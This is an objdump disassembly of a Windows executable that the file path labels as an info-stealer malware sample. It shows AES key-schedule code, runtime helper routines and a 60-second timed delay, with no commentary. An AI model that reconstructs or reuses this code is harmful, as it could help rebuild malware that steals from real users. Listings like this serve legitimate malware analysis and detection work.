
malware_samples/stealer/4c351350f946bd33db9e87df3ad0dfd9547bb88156318df5129a7438b79d4b00.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	48 81 ec 98 00 00 00 	sub    $0x98,%rsp
   140001007:	44 0f 29 b4 24 80 00 	movaps %xmm14,0x80(%rsp)
   14000100e:	00 00 
   140001010:	44 0f 29 6c 24 70    	movaps %xmm13,0x70(%rsp)
   140001016:	44 0f 29 64 24 60    	movaps %xmm12,0x60(%rsp)
   14000101c:	44 0f 29 5c 24 50    	movaps %xmm11,0x50(%rsp)
   140001022:	44 0f 29 54 24 40    	movaps %xmm10,0x40(%rsp)
   140001028:	44 0f 29 4c 24 30    	movaps %xmm9,0x30(%rsp)
   14000102e:	44 0f 29 44 24 20    	movaps %xmm8,0x20(%rsp)
   140001034:	0f 29 7c 24 10       	movaps %xmm7,0x10(%rsp)
   140001039:	0f 29 34 24          	movaps %xmm6,(%rsp)
   14000103d:	66 0f 38 db 42 10    	aesimc 0x10(%rdx),%xmm0
   140001043:	66 0f 38 db 4a 20    	aesimc 0x20(%rdx),%xmm1
   140001049:	66 0f 38 db 52 30    	aesimc 0x30(%rdx),%xmm2
   14000104f:	66 0f 38 db 5a 40    	aesimc 0x40(%rdx),%xmm3
   140001055:	66 0f 38 db 62 50    	aesimc 0x50(%rdx),%xmm4
   14000105b:	66 0f 38 db 6a 60    	aesimc 0x60(%rdx),%xmm5
   140001061:	66 0f 38 db 72 70    	aesimc 0x70(%rdx),%xmm6
   140001067:	66 0f 38 db ba 80 00 	aesimc 0x80(%rdx),%xmm7
   14000106e:	00 00 
   140001070:	66 44 0f 38 db 82 90 	aesimc 0x90(%rdx),%xmm8
   140001077:	00 00 00 
   14000107a:	66 44 0f 38 db 8a a0 	aesimc 0xa0(%rdx),%xmm9
   140001081:	00 00 00 
   140001084:	66 44 0f 38 db 92 b0 	aesimc 0xb0(%rdx),%xmm10
   14000108b:	00 00 00 
   14000108e:	66 44 0f 38 db 9a c0 	aesimc 0xc0(%rdx),%xmm11
   140001095:	00 00 00 
   140001098:	66 44 0f 38 db a2 d0 	aesimc 0xd0(%rdx),%xmm12
   14000109f:	00 00 00 
   1400010a2:	44 0f 28 2a          	movaps (%rdx),%xmm13
   1400010a6:	44 0f 28 b2 e0 00 00 	movaps 0xe0(%rdx),%xmm14
   1400010ad:	00 
   1400010ae:	44 0f 29 29          	movaps %xmm13,(%rcx)
   1400010b2:	66 0f 7f 41 10       	movdqa %xmm0,0x10(%rcx)
   1400010b7:	66 0f 7f 49 20       	movdqa %xmm1,0x20(%rcx)
   1400010bc:	66 0f 7f 51 30       	movdqa %xmm2,0x30(%rcx)
   1400010c1:	66 0f 7f 59 40       	movdqa %xmm3,0x40(%rcx)
   1400010c6:	66 0f 7f 61 50       	movdqa %xmm4,0x50(%rcx)
   1400010cb:	66 0f 7f 69 60       	movdqa %xmm5,0x60(%rcx)
   1400010d0:	66 0f 7f 71 70       	movdqa %xmm6,0x70(%rcx)
   1400010d5:	66 0f 7f b9 80 00 00 	movdqa %xmm7,0x80(%rcx)
   1400010dc:	00 
   1400010dd:	66 44 0f 7f 81 90 00 	movdqa %xmm8,0x90(%rcx)
   1400010e4:	00 00 
   1400010e6:	66 44 0f 7f 89 a0 00 	movdqa %xmm9,0xa0(%rcx)
   1400010ed:	00 00 
   1400010ef:	66 44 0f 7f 91 b0 00 	movdqa %xmm10,0xb0(%rcx)
   1400010f6:	00 00 
   1400010f8:	66 44 0f 7f 99 c0 00 	movdqa %xmm11,0xc0(%rcx)
   1400010ff:	00 00 
   140001101:	66 44 0f 7f a1 d0 00 	movdqa %xmm12,0xd0(%rcx)
   140001108:	00 00 
   14000110a:	44 0f 29 b1 e0 00 00 	movaps %xmm14,0xe0(%rcx)
   140001111:	00 
   140001112:	0f 28 34 24          	movaps (%rsp),%xmm6
   140001116:	0f 28 7c 24 10       	movaps 0x10(%rsp),%xmm7
   14000111b:	44 0f 28 44 24 20    	movaps 0x20(%rsp),%xmm8
   140001121:	44 0f 28 4c 24 30    	movaps 0x30(%rsp),%xmm9
   140001127:	44 0f 28 54 24 40    	movaps 0x40(%rsp),%xmm10
   14000112d:	44 0f 28 5c 24 50    	movaps 0x50(%rsp),%xmm11
   140001133:	44 0f 28 64 24 60    	movaps 0x60(%rsp),%xmm12
   140001139:	44 0f 28 6c 24 70    	movaps 0x70(%rsp),%xmm13
   14000113f:	44 0f 28 b4 24 80 00 	movaps 0x80(%rsp),%xmm14
   140001146:	00 00 
   140001148:	48 81 c4 98 00 00 00 	add    $0x98,%rsp
   14000114f:	c3                   	ret
   140001150:	55                   	push   %rbp
   140001151:	41 56                	push   %r14
   140001153:	56                   	push   %rsi
   140001154:	57                   	push   %rdi
   140001155:	53                   	push   %rbx
   140001156:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   14000115d:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
   140001164:	00 
   140001165:	48 c7 45 f8 fe ff ff 	movq   $0xfffffffffffffffe,-0x8(%rbp)
   14000116c:	ff 
   14000116d:	48 89 4d b0          	mov    %rcx,-0x50(%rbp)
   140001171:	48 8b 79 18          	mov    0x18(%rcx),%rdi
   140001175:	48 89 7d c0          	mov    %rdi,-0x40(%rbp)
   140001179:	48 c7 45 b8 01 00 00 	movq   $0x1,-0x48(%rbp)
   140001180:	00 
   140001181:	8b 05 61 80 0e 00    	mov    0xe8061(%rip),%eax        # 0x1400e91e8
   140001187:	65 48 8b 0c 25 58 00 	mov    %gs:0x58,%rcx
   14000118e:	00 00 
   140001190:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   140001194:	48 8d b0 38 00 00 00 	lea    0x38(%rax),%rsi
   14000119b:	0f b6 80 40 00 00 00 	movzbl 0x40(%rax),%eax
   1400011a2:	83 f8 01             	cmp    $0x1,%eax
   1400011a5:	74 1c                	je     0x1400011c3
   1400011a7:	83 f8 02             	cmp    $0x2,%eax
   1400011aa:	75 0b                	jne    0x1400011b7
   1400011ac:	c6 45 f7 01          	movb   $0x1,-0x9(%rbp)
   1400011b0:	e8 5b fa 01 00       	call   0x140020c10
   1400011b5:	0f 0b                	ud2
   1400011b7:	c6 45 f7 01          	movb   $0x1,-0x9(%rbp)
   1400011bb:	48 89 f1             	mov    %rsi,%rcx
   1400011be:	e8 4d f9 01 00       	call   0x140020b10
   1400011c3:	48 8b 06             	mov    (%rsi),%rax
   1400011c6:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   1400011ca:	48 89 3e             	mov    %rdi,(%rsi)
   1400011cd:	48 8d 4d e8          	lea    -0x18(%rbp),%rcx
   1400011d1:	e8 3a d3 01 00       	call   0x14001e510
   1400011d6:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   1400011da:	48 85 c0             	test   %rax,%rax
   1400011dd:	74 13                	je     0x1400011f2
   1400011df:	f0 48 ff 08          	lock decq (%rax)
   1400011e3:	75 0d                	jne    0x1400011f2
   1400011e5:	c6 45 f7 00          	movb   $0x0,-0x9(%rbp)
   1400011e9:	48 8d 4d e8          	lea    -0x18(%rbp),%rcx
   1400011ed:	e8 5e d4 01 00       	call   0x14001e650
   1400011f2:	48 8b 4d b0          	mov    -0x50(%rbp),%rcx
   1400011f6:	48 8b 01             	mov    (%rcx),%rax
   1400011f9:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   1400011fd:	48 8b 49 10          	mov    0x10(%rcx),%rcx
   140001201:	48 89 ce             	mov    %rcx,%rsi
   140001204:	48 c1 e6 04          	shl    $0x4,%rsi
   140001208:	48 01 d6             	add    %rdx,%rsi
   14000120b:	48 89 55 b8          	mov    %rdx,-0x48(%rbp)
   14000120f:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
   140001213:	48 89 75 d0          	mov    %rsi,-0x30(%rbp)
   140001217:	48 85 c9             	test   %rcx,%rcx
   14000121a:	74 6f                	je     0x14000128b
   14000121c:	48 83 c2 10          	add    $0x10,%rdx
   140001220:	48 8b 3d a9 00 02 00 	mov    0x200a9(%rip),%rdi        # 0x1400212d0
   140001227:	48 8b 1d 9a 00 02 00 	mov    0x2009a(%rip),%rbx        # 0x1400212c8
   14000122e:	eb 29                	jmp    0x140001259
   140001230:	4c 8b 75 e0          	mov    -0x20(%rbp),%r14
   140001234:	4d 8b 76 f8          	mov    -0x8(%r14),%r14
   140001238:	ff d7                	call   *%rdi
   14000123a:	48 89 c1             	mov    %rax,%rcx
   14000123d:	31 d2                	xor    %edx,%edx
   14000123f:	4d 89 f0             	mov    %r14,%r8
   140001242:	ff d3                	call   *%rbx
   140001244:	48 8b 55 a8          	mov    -0x58(%rbp),%rdx
   140001248:	48 8d 42 f0          	lea    -0x10(%rdx),%rax
   14000124c:	48 83 c2 10          	add    $0x10,%rdx
   140001250:	48 83 c0 10          	add    $0x10,%rax
   140001254:	48 39 f0             	cmp    %rsi,%rax
   140001257:	74 2f                	je     0x140001288
   140001259:	48 8b 4a f0          	mov    -0x10(%rdx),%rcx
   14000125d:	48 89 55 a8          	mov    %rdx,-0x58(%rbp)
   140001261:	48 8b 42 f8          	mov    -0x8(%rdx),%rax
   140001265:	48 89 4d e0          	mov    %rcx,-0x20(%rbp)
   140001269:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
   14000126d:	ff 50 18             	call   *0x18(%rax)
   140001270:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140001274:	48 83 78 08 00       	cmpq   $0x0,0x8(%rax)
   140001279:	74 c9                	je     0x140001244
   14000127b:	48 83 78 10 11       	cmpq   $0x11,0x10(%rax)
   140001280:	73 ae                	jae    0x140001230
   140001282:	4c 8b 75 e0          	mov    -0x20(%rbp),%r14
   140001286:	eb b0                	jmp    0x140001238
   140001288:	48 89 f2             	mov    %rsi,%rdx
   14000128b:	48 89 55 c0          	mov    %rdx,-0x40(%rbp)
   14000128f:	c6 45 f6 00          	movb   $0x0,-0xa(%rbp)
   140001293:	48 8d 4d b8          	lea    -0x48(%rbp),%rcx
   140001297:	e8 14 d5 01 00       	call   0x14001e7b0
   14000129c:	90                   	nop
   14000129d:	48 81 c4 80 00 00 00 	add    $0x80,%rsp
   1400012a4:	5b                   	pop    %rbx
   1400012a5:	5f                   	pop    %rdi
   1400012a6:	5e                   	pop    %rsi
   1400012a7:	41 5e                	pop    %r14
   1400012a9:	5d                   	pop    %rbp
   1400012aa:	c3                   	ret
   1400012ab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400012b0:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1400012b5:	55                   	push   %rbp
   1400012b6:	41 56                	push   %r14
   1400012b8:	56                   	push   %rsi
   1400012b9:	57                   	push   %rdi
   1400012ba:	53                   	push   %rbx
   1400012bb:	48 83 ec 20          	sub    $0x20,%rsp
   1400012bf:	48 8d aa 80 00 00 00 	lea    0x80(%rdx),%rbp
   1400012c6:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   1400012ca:	48 85 c0             	test   %rax,%rax
   1400012cd:	74 13                	je     0x1400012e2
   1400012cf:	f0 48 ff 08          	lock decq (%rax)
   1400012d3:	75 0d                	jne    0x1400012e2
   1400012d5:	c6 45 f7 00          	movb   $0x0,-0x9(%rbp)
   1400012d9:	48 8d 4d e8          	lea    -0x18(%rbp),%rcx
   1400012dd:	e8 6e d3 01 00       	call   0x14001e650
   1400012e2:	c6 45 f7 00          	movb   $0x0,-0x9(%rbp)
   1400012e6:	48 83 c4 20          	add    $0x20,%rsp
   1400012ea:	5b                   	pop    %rbx
   1400012eb:	5f                   	pop    %rdi
   1400012ec:	5e                   	pop    %rsi
   1400012ed:	41 5e                	pop    %r14
   1400012ef:	5d                   	pop    %rbp
   1400012f0:	c3                   	ret
   1400012f1:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   1400012f8:	0f 1f 84 00 00 00 00 
   1400012ff:	00 
   140001300:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140001305:	55                   	push   %rbp
   140001306:	41 56                	push   %r14
   140001308:	56                   	push   %rsi
   140001309:	57                   	push   %rdi
   14000130a:	53                   	push   %rbx
   14000130b:	48 83 ec 20          	sub    $0x20,%rsp
   14000130f:	48 8d aa 80 00 00 00 	lea    0x80(%rdx),%rbp
   140001316:	80 7d f7 00          	cmpb   $0x0,-0x9(%rbp)
   14000131a:	74 2c                	je     0x140001348
   14000131c:	48 83 7d b8 00       	cmpq   $0x0,-0x48(%rbp)
   140001321:	74 25                	je     0x140001348
   140001323:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   140001327:	e8 e4 d1 01 00       	call   0x14001e510
   14000132c:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
   140001330:	48 85 c0             	test   %rax,%rax
   140001333:	74 13                	je     0x140001348
   140001335:	f0 48 ff 08          	lock decq (%rax)
   140001339:	75 0d                	jne    0x140001348
   14000133b:	c6 45 f6 01          	movb   $0x1,-0xa(%rbp)
   14000133f:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   140001343:	e8 08 d3 01 00       	call   0x14001e650
   140001348:	c6 45 f6 01          	movb   $0x1,-0xa(%rbp)
   14000134c:	48 83 c4 20          	add    $0x20,%rsp
   140001350:	5b                   	pop    %rbx
   140001351:	5f                   	pop    %rdi
   140001352:	5e                   	pop    %rsi
   140001353:	41 5e                	pop    %r14
   140001355:	5d                   	pop    %rbp
   140001356:	c3                   	ret
   140001357:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000135e:	00 00 
   140001360:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140001365:	55                   	push   %rbp
   140001366:	41 56                	push   %r14
   140001368:	56                   	push   %rsi
   140001369:	57                   	push   %rdi
   14000136a:	53                   	push   %rbx
   14000136b:	48 83 ec 20          	sub    $0x20,%rsp
   14000136f:	48 8d aa 80 00 00 00 	lea    0x80(%rdx),%rbp
   140001376:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
   14000137a:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
   14000137e:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140001382:	48 83 78 08 00       	cmpq   $0x0,0x8(%rax)
   140001387:	74 11                	je     0x14000139a
   140001389:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   14000138d:	48 8b 50 10          	mov    0x10(%rax),%rdx
   140001391:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   140001395:	e8 46 d0 00 00       	call   0x14000e3e0
   14000139a:	48 8d 4d b8          	lea    -0x48(%rbp),%rcx
   14000139e:	e8 0d d4 01 00       	call   0x14001e7b0
   1400013a3:	c6 45 f6 00          	movb   $0x0,-0xa(%rbp)
   1400013a7:	48 83 c4 20          	add    $0x20,%rsp
   1400013ab:	5b                   	pop    %rbx
   1400013ac:	5f                   	pop    %rdi
   1400013ad:	5e                   	pop    %rsi
   1400013ae:	41 5e                	pop    %r14
   1400013b0:	5d                   	pop    %rbp
   1400013b1:	c3                   	ret
   1400013b2:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   1400013b9:	1f 84 00 00 00 00 00 
   1400013c0:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1400013c5:	55                   	push   %rbp
   1400013c6:	41 56                	push   %r14
   1400013c8:	56                   	push   %rsi
   1400013c9:	57                   	push   %rdi
   1400013ca:	53                   	push   %rbx
   1400013cb:	48 83 ec 20          	sub    $0x20,%rsp
   1400013cf:	48 8d aa 80 00 00 00 	lea    0x80(%rdx),%rbp
   1400013d6:	80 7d f6 00          	cmpb   $0x0,-0xa(%rbp)
   1400013da:	75 0b                	jne    0x1400013e7
   1400013dc:	48 83 c4 20          	add    $0x20,%rsp
   1400013e0:	5b                   	pop    %rbx
   1400013e1:	5f                   	pop    %rdi
   1400013e2:	5e                   	pop    %rsi
   1400013e3:	41 5e                	pop    %r14
   1400013e5:	5d                   	pop    %rbp
   1400013e6:	c3                   	ret
   1400013e7:	48 8b 4d b0          	mov    -0x50(%rbp),%rcx
   1400013eb:	e8 b0 d5 01 00       	call   0x14001e9a0
   1400013f0:	eb ea                	jmp    0x1400013dc
   1400013f2:	cc                   	int3
   1400013f3:	cc                   	int3
   1400013f4:	cc                   	int3
   1400013f5:	cc                   	int3
   1400013f6:	cc                   	int3
   1400013f7:	cc                   	int3
   1400013f8:	cc                   	int3
   1400013f9:	cc                   	int3
   1400013fa:	cc                   	int3
   1400013fb:	cc                   	int3
   1400013fc:	cc                   	int3
   1400013fd:	cc                   	int3
   1400013fe:	cc                   	int3
   1400013ff:	cc                   	int3
   140001400:	41 57                	push   %r15
   140001402:	41 56                	push   %r14
   140001404:	41 55                	push   %r13
   140001406:	41 54                	push   %r12
   140001408:	56                   	push   %rsi
   140001409:	57                   	push   %rdi
   14000140a:	55                   	push   %rbp
   14000140b:	53                   	push   %rbx
   14000140c:	48 81 ec 98 00 00 00 	sub    $0x98,%rsp
   140001413:	48 89 ce             	mov    %rcx,%rsi
   140001416:	31 c9                	xor    %ecx,%ecx
   140001418:	31 d2                	xor    %edx,%edx
   14000141a:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140001420:	41 b9 03 00 1f 00    	mov    $0x1f0003,%r9d
   140001426:	ff 15 94 fe 01 00    	call   *0x1fe94(%rip)        # 0x1400212c0
   14000142c:	48 85 c0             	test   %rax,%rax
   14000142f:	74 5e                	je     0x14000148f
   140001431:	48 89 c7             	mov    %rax,%rdi
   140001434:	48 c7 44 24 70 00 ba 	movq   $0xffffffffdc3cba00,0x70(%rsp)
   14000143b:	3c dc 
   14000143d:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
   140001444:	00 
   140001445:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   14000144c:	00 00 
   14000144e:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140001453:	48 89 c1             	mov    %rax,%rcx
   140001456:	45 31 c0             	xor    %r8d,%r8d
   140001459:	45 31 c9             	xor    %r9d,%r9d
   14000145c:	ff 15 56 fe 01 00    	call   *0x1fe56(%rip)        # 0x1400212b8
   140001462:	85 c0                	test   %eax,%eax
   140001464:	74 20                	je     0x140001486
   140001466:	48 89 f9             	mov    %rdi,%rcx
   140001469:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   14000146e:	ff 15 3c fe 01 00    	call   *0x1fe3c(%rip)        # 0x1400212b0
   140001474:	89 c3                	mov    %eax,%ebx
   140001476:	48 89 f9             	mov    %rdi,%rcx
   140001479:	ff 15 29 fe 01 00    	call   *0x1fe29(%rip)        # 0x1400212a8
   14000147f:	83 fb ff             	cmp    $0xffffffff,%ebx
   140001482:	75 16                	jne    0x14000149a
   140001484:	eb 09                	jmp    0x14000148f
   140001486:	48 89 f9             	mov    %rdi,%rcx
   140001489:	ff 15 19 fe 01 00    	call   *0x1fe19(%rip)        # 0x1400212a8
   14000148f:	b9 60 ea 00 00       	mov    $0xea60,%ecx
   140001494:	ff 15 06 fe 01 00    	call   *0x1fe06(%rip)        # 0x1400212a0
   14000149a:	4c 8b 66 20          	mov    0x20(%rsi),%r12
   14000149e:	4d 85 e4             	test   %r12,%r12
   1400014a1:	0f 84 8c 00 00 00    	je     0x140001533
   1400014a7:	48 8b 7e 08          	mov    0x8(%rsi),%rdi
   1400014ab:	48 8b 5e 10          	mov    0x10(%rsi),%rbx
   1400014af:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   1400014b4:	48 89 fa             	mov    %rdi,%rdx
   1400014b7:	49 89 d8             	mov    %rbx,%r8
   1400014ba:	e8 f1 8a 00 00       	call   0x140009fb0
   1400014bf:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   1400014c4:	4c 8b 7c 24 60       	mov    0x60(%rsp),%r15
   1400014c9:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
   1400014ce:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   1400014d3:	4c 89 fa             	mov    %r15,%rdx
   1400014d6:	e8 b5 91 00 00       	call   0x14000a690
   1400014db:	31 c0                	xor    %eax,%eax
   1400014dd:	48 3b 44 24 38       	cmp    0x38(%rsp),%rax
   1400014e2:	0f 81 fe 00 00 00    	jno    0x1400015e6
   1400014e8:	4c 8b 74 24 40       	mov    0x40(%rsp),%r14
   1400014ed:	4c 8b 6c 24 48       	mov    0x48(%rsp),%r13
   1400014f2:	48 d1 e5             	shl    $1,%rbp
   1400014f5:	48 85 ed             	test   %rbp,%rbp
   1400014f8:	74 14                	je     0x14000150e
   1400014fa:	ff 15 d0 fd 01 00    	call   *0x1fdd0(%rip)        # 0x1400212d0
   140001500:	48 89 c1             	mov    %rax,%rcx
   140001503:	31 d2                	xor    %edx,%edx
   140001505:	4d 89 f8             	mov    %r15,%r8
   140001508:	ff 15 ba fd 01 00    	call   *0x1fdba(%rip)        # 0x1400212c8
   14000150e:	4c 89 f1             	mov    %r14,%rcx
   140001511:	41 ff d4             	call   *%r12
   140001514:	41 c6 06 00          	movb   $0x0,(%r14)
   140001518:	4d 85 ed             	test   %r13,%r13
   14000151b:	74 1e                	je     0x14000153b
   14000151d:	ff 15 ad fd 01 00    	call   *0x1fdad(%rip)        # 0x1400212d0
   140001523:	48 89 c1             	mov    %rax,%rcx
   140001526:	31 d2                	xor    %edx,%edx
   140001528:	4d 89 f0             	mov    %r14,%r8
   14000152b:	ff 15 97 fd 01 00    	call   *0x1fd97(%rip)        # 0x1400212c8
   140001531:	eb 08                	jmp    0x14000153b
   140001533:	48 8b 7e 08          	mov    0x8(%rsi),%rdi
   140001537:	48 8b 5e 10          	mov    0x10(%rsi),%rbx
   14000153b:	48 89 f9             	mov    %rdi,%rcx
   14000153e:	48 89 da             	mov    %rbx,%rdx
   140001541:	e8 da c8 01 00       	call   0x14001de20
   140001546:	89 c1                	mov    %eax,%ecx
   140001548:	83 e1 03             	and    $0x3,%ecx
   14000154b:	83 f9 01             	cmp    $0x1,%ecx
   14000154e:	74 2f                	je     0x14000157f
   140001550:	48 83 3e 00          	cmpq   $0x0,(%rsi)
   140001554:	74 14                	je     0x14000156a
   140001556:	ff 15 74 fd 01 00    	call   *0x1fd74(%rip)        # 0x1400212d0
   14000155c:	48 89 c1             	mov    %rax,%rcx
   14000155f:	31 d2                	xor    %edx,%edx
   140001561:	49 89 f8             	mov    %rdi,%r8
   140001564:	ff 15 5e fd 01 00    	call   *0x1fd5e(%rip)        # 0x1400212c8
   14000156a:	90                   	nop
   14000156b:	48 81 c4 98 00 00 00 	add    $0x98,%rsp
   140001572:	5b                   	pop    %rbx
   140001573:	5d                   	pop    %rbp
   140001574:	5f                   	pop    %rdi
   140001575:	5e                   	pop    %rsi
   140001576:	41 5c                	pop    %r12
   140001578:	41 5d                	pop    %r13
   14000157a:	41 5e                	pop    %r14
   14000157c:	41 5f                	pop    %r15
   14000157e:	c3                   	ret
   14000157f:	48 8b 58 ff          	mov    -0x1(%rax),%rbx
   140001583:	4c 8b 78 07          	mov    0x7(%rax),%r15
   140001587:	49 8b 17             	mov    (%r15),%rdx
   14000158a:	48 85 d2             	test   %rdx,%rdx
   14000158d:	74 0b                	je     0x14000159a
   14000158f:	48 89 d9             	mov    %rbx,%rcx
   140001592:	49 89 c6             	mov    %rax,%r14
   140001595:	ff d2                	call   *%rdx
   140001597:	4c 89 f0             	mov    %r14,%rax
   14000159a:	48 ff c8             	dec    %rax
   14000159d:	49 89 c6             	mov    %rax,%r14
   1400015a0:	49 83 7f 08 00       	cmpq   $0x0,0x8(%r15)
   1400015a5:	74 1f                	je     0x1400015c6
   1400015a7:	49 83 7f 10 11       	cmpq   $0x11,0x10(%r15)
   1400015ac:	72 04                	jb     0x1400015b2
   1400015ae:	48 8b 5b f8          	mov    -0x8(%rbx),%rbx
   1400015b2:	ff 15 18 fd 01 00    	call   *0x1fd18(%rip)        # 0x1400212d0
   1400015b8:	48 89 c1             	mov    %rax,%rcx
   1400015bb:	31 d2                	xor    %edx,%edx
   1400015bd:	49 89 d8             	mov    %rbx,%r8
   1400015c0:	ff 15 02 fd 01 00    	call   *0x1fd02(%rip)        # 0x1400212c8
   1400015c6:	ff 15 04 fd 01 00    	call   *0x1fd04(%rip)        # 0x1400212d0
   1400015cc:	48 89 c1             	mov    %rax,%rcx
   1400015cf:	31 d2                	xor    %edx,%edx
   1400015d1:	4d 89 f0             	mov    %r14,%r8
   1400015d4:	ff 15 ee fc 01 00    	call   *0x1fcee(%rip)        # 0x1400212c8
   1400015da:	48 83 3e 00          	cmpq   $0x0,(%rsi)
   1400015de:	0f 85 72 ff ff ff    	jne    0x140001556
   1400015e4:	eb 84                	jmp    0x14000156a
   1400015e6:	0f 10 44 24 38       	movups 0x38(%rsp),%xmm0
   1400015eb:	0f 10 4c 24 48       	movups 0x48(%rsp),%xmm1
   1400015f0:	0f 29 8c 24 80 00 00 	movaps %xmm1,0x80(%rsp)
   1400015f7:	00 
   1400015f8:	0f 29 44 24 70       	movaps %xmm0,0x70(%rsp)
   1400015fd:	48 8d 05 7c 02 02 00 	lea    0x2027c(%rip),%rax        # 0x140021880
   140001604:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001609:	48 8d 0d 60 1b 0e 00 	lea    0xe1b60(%rip),%rcx        # 0x1400e3170
   140001610:	4c 8d 0d 59 01 02 00 	lea    0x20159(%rip),%r9        # 0x140021770
   140001617:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   14000161c:	ba 2b 00 00 00       	mov    $0x2b,%edx
   140001621:	e8 ea ea 01 00       	call   0x140020110
   140001626:	cc                   	int3
   140001627:	cc                   	int3
   140001628:	cc                   	int3
   140001629:	cc                   	int3
   14000162a:	cc                   	int3
   14000162b:	cc                   	int3
   14000162c:	cc                   	int3
   14000162d:	cc                   	int3
   14000162e:	cc                   	int3
   14000162f:	cc                   	int3
   140001630:	48 83 ec 28          	sub    $0x28,%rsp
   140001634:	ff d1                	call   *%rcx
   140001636:	90                   	nop
   140001637:	48 83 c4 28          	add    $0x28,%rsp
   14000163b:	c3                   	ret
   14000163c:	cc                   	int3
   14000163d:	cc                   	int3
   14000163e:	cc                   	int3
   14000163f:	cc                   	int3
   140001640:	48 83 ec 38          	sub    $0x38,%rsp
   140001644:	44 8b 42 10          	mov    0x10(%rdx),%r8d
   140001648:	41 f7 c0 00 00 00 02 	test   $0x2000000,%r8d
   14000164f:	0f 85 a4 00 00 00    	jne    0x1400016f9
   140001655:	0f b6 01             	movzbl (%rcx),%eax
   140001658:	41 f7 c0 00 00 00 04 	test   $0x4000000,%r8d
   14000165f:	0f 85 de 00 00 00    	jne    0x140001743
   140001665:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000166a:	41 89 c0             	mov    %eax,%r8d
   14000166d:	3c 0a                	cmp    $0xa,%al
   14000166f:	72 33                	jb     0x1400016a4
   140001671:	0f b6 c8             	movzbl %al,%ecx
   140001674:	44 8d 04 89          	lea    (%rcx,%rcx,4),%r8d
   140001678:	46 8d 04 c1          	lea    (%rcx,%r8,8),%r8d
   14000167c:	41 c1 e8 0c          	shr    $0xc,%r8d
   140001680:	41 6b c8 64          	imul   $0x64,%r8d,%ecx
   140001684:	41 89 c1             	mov    %eax,%r9d
   140001687:	41 28 c9             	sub    %cl,%r9b
   14000168a:	41 0f b6 c9          	movzbl %r9b,%ecx
   14000168e:	4c 8d 0d 83 ed 0d 00 	lea    0xded83(%rip),%r9        # 0x1400e0418
   140001695:	41 0f b7 0c 49       	movzwl (%r9,%rcx,2),%ecx
   14000169a:	66 89 4c 24 34       	mov    %cx,0x34(%rsp)
   14000169f:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400016a4:	45 84 c0             	test   %r8b,%r8b
   1400016a7:	41 0f 94 c1          	sete   %r9b
   1400016ab:	84 c0                	test   %al,%al
   1400016ad:	0f 95 c0             	setne  %al
   1400016b0:	44 84 c8             	test   %r9b,%al
   1400016b3:	75 18                	jne    0x1400016cd
   1400016b5:	41 0f b6 c0          	movzbl %r8b,%eax
   1400016b9:	4c 8d 05 58 ed 0d 00 	lea    0xded58(%rip),%r8        # 0x1400e0418
   1400016c0:	41 0f b6 44 40 01    	movzbl 0x1(%r8,%rax,2),%eax
   1400016c6:	88 44 0c 32          	mov    %al,0x32(%rsp,%rcx,1)
   1400016ca:	48 ff c9             	dec    %rcx
   1400016cd:	b8 03 00 00 00       	mov    $0x3,%eax
   1400016d2:	48 29 c8             	sub    %rcx,%rax
   1400016d5:	48 01 e1             	add    %rsp,%rcx
   1400016d8:	48 83 c1 33          	add    $0x33,%rcx
   1400016dc:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400016e1:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400016e6:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400016ec:	48 89 d1             	mov    %rdx,%rcx
   1400016ef:	b2 01                	mov    $0x1,%dl
   1400016f1:	45 31 c9             	xor    %r9d,%r9d
   1400016f4:	e9 ac 00 00 00       	jmp    0x1400017a5
   1400016f9:	0f b6 01             	movzbl (%rcx),%eax
   1400016fc:	41 b9 03 00 00 00    	mov    $0x3,%r9d
   140001702:	48 8d 0d cf fd 0d 00 	lea    0xdfdcf(%rip),%rcx        # 0x1400e14d8
   140001709:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001710:	4d 89 c8             	mov    %r9,%r8
   140001713:	44 0f b6 d0          	movzbl %al,%r10d
   140001717:	c0 e8 04             	shr    $0x4,%al
   14000171a:	45 89 d1             	mov    %r10d,%r9d
   14000171d:	41 83 e1 0f          	and    $0xf,%r9d
